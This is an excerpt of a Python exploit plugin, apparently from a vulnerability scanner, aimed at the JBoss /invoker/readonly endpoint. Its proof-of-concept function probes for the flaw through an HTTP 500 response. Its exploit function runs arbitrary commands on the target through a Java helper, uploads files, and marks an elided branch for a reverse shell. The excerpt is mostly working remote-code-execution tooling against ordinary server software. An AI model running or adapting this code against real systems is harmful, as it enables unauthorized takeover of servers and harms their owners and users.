...
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
        ...
        status = requests.post(url+"/invoker/readonly", headers=heads, verify=False)
        status = status.status_code
        if status == 500:
            result['Result'] =True
            result['Result_Info']= "/invoker/readonly"
        return result
...
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:
        ...
        if exp_data['type']=='cmd':
            popen = subprocess.Popen(['java', '-cp', SETUP_DIR,'com.jboss.main.main', url, exp_data['command']], stdout=subprocess.PIPE)
            echo = popen.stdout.read()
            print(echo)
            result['Result'] = True
            result['Result_Info'] = echo.decode("utf8","ignore")
        #反弹shell    
        ...
        if exp_data['type']=='uploadfile':
            popen = subprocess.Popen(['java', '-cp', SETUP_DIR,'com.jboss.main.mainupload', url, exp_data['filename'],base64.b64encode(exp_data['filename_contents'])], stdout=subprocess.PIPE)
